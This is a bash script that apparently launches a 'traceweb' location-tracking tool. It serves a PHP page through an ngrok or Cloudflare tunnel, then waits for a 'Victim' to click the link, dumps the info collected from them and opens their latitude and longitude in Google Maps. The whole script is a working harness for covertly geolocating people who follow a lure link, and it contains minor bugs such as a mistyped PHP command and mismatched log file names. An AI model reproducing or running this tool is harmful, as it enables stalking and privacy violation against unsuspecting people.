#!/bin/bash
CWD=`pwd`
if [[ $CWD != *'programs/traceweb'* ]]; then
  cd programs/traceweb>/dev/null 2>&1
fi
NWD=`pwd`
signal_SIGINT() {
  local cloud="${NWD}/assets/cloudflare-log"
  local ph="${NWD}/assets/phpLog"
  local result="${NWD}/assets/php/result.txt"
  local info="${NWD}/assets/php/info.txt"
  local error="${NWD}/assets/php/error.txt"
  cacheMem=($error $info $result $ph $cloud)
  for i in "${cacheMem[@]}"; do
    if [[ -f ${i} ]]; then
      rm -rf ${i} >/dev/null 2>&1
    fi
  done
  exit 0
}
trap signal_SIGINT SIGINT
OS=`uname -o`
#<<<-----colors----->>>#
S0="\033[1;30m" B0="\033[1;40m"
S1="\033[1;31m" B1="\033[1;41m"
S2="\033[1;32m" B2="\033[1;42m"
S3="\033[1;33m" B3="\033[1;43m"
S4="\033[1;34m" B4="\033[1;44m"
S5="\033[1;35m" B5="\033[1;45m"
S6="\033[1;36m" B6="\033[1;46m"
S7="\033[1;37m" B7="\033[1;47m"
R0="\033[00m"   R1="\033[1;00m"
#<---x--->#
localHost() {
  killall php>/dev/null 2>&1
  cd assets> /dev/null 2>&1
  printf "">phpLog.txt
  php -S 127.0.0.1:8080 > phpLog.txt 2>&1 &
  printf "${S2}[${S4}+${S2}]${S3} Server started on: ${S4}http://127.0.0.1:8080${R0}\n"
  xdg-open "http://127.0.0.1:8080/"
}
ngrokHost() {
  killall php ngrok>/dev/null 2>&1
  cd assets>/dev/null 2>&1
  printf "">phpLog.txt
  php-S 127.0.0.1:8080 > phpLogs.txt 2>&1 &
  if [[ ${OS,,} == *'android'* ]]; then
    termux-chroot ngrok http 8080 >/dev/null 2>&1 &
  else
    sudo ngrok http 8080 > /dev/null 2>&1 &
  fi
  sleep 10
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[-0-9a-z]*\.ngrok.io")
  printf "${S2}[${S4}+${S2}]${S3} Server started on: ${S4}https://%s${R0}\n" $link
}
cloudflareHost() {
  killall php cloudflared>/dev/null 2>&1
  cd assets>/dev/null 2>&1
  printf "">phpLog.txt
  printf "">cloudflare-log
  php -S 127.0.0.1:3333 > phpLogs.txt 2>&1 &
  if [[ ${OS,,} == *'android'* ]]; then
    termux-chroot cloudflared tunnel -url 127.0.0.1:3333 --logfile cloudflare-log > /dev/null 2>&1 &
  else
    sudo cloudflared tunnel -url 127.0.0.1:3333 --logfile  cloudflare-log > /dev/null 2>&1 &
  fi
  sleep 3
  if [ -f cloudflare-log ]; then
    while true; do
      link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloudflare-log")
      if [[ ! -z $link ]]; then
        link="${link/https:\/\//}"
        printf "${S2}[${S4}+${S2}]${S3} Server started on: ${S4}https://%s${R0}\n" $link
        break
      fi
    done
  fi
}
checkFound() {
    printf "\n${SB}WATING FOR RESPOSNSES!!${R0}\n"
    Result="php/result.txt"
    Infos="php/info.txt"
    while [ true ]; do
        if [[ -e $Infos ]]; then
            printf "\n${S2}Victim Clicked on the link ;)!!${R0}\n"
            cat  $Infos | jq
            cat $Infos >php/info.log
            rm -rf $Infos >/dev/null 2>&1
        fi
        if [[ -e $Result ]]; then
            latitude=$(cat $Result | jq -r .info[].lat)
            longitude=$(cat $Result | jq -r .info[].lon)
            xdg-open """https://maps.google.com/maps?q="${latitude}","${longitude}""""
            rm -rf $Result >/dev/null 2>&1
            printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
        fi
    done
  }
printf "\n${S2}       <--:Select server:-->${R0}\n\n"
printf "${S2}1.${S4} LocalHost\n${S2}2.${S4} Ngrok ${S2}(${S1}currently down${S2})\n${S2}3.${S4} Cloudflare ${S2}(${S7}recommended${S2})${R0}\n"
while true; do
  printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}trace/server/number${S7})> ${R0}"; read serverOpt
  if [[ ${serverOpt} == '1' || ${serverOpt} == '01' ]]; then
    localHost
    checkFound
    break
  elif [[ ${serverOpt} == '2' || ${serverOpt} == '02' ]]; then
    ngrokHost
    checkFound
    break
  elif [[ ${serverOpt} == '3' || ${serverOpt} == '03' ]]; then
    cloudflareHost
    checkFound
    break
  else
    printf "${S2}[${S1}!${S2}]${S4} Enter any valid option\n"
  fi
done
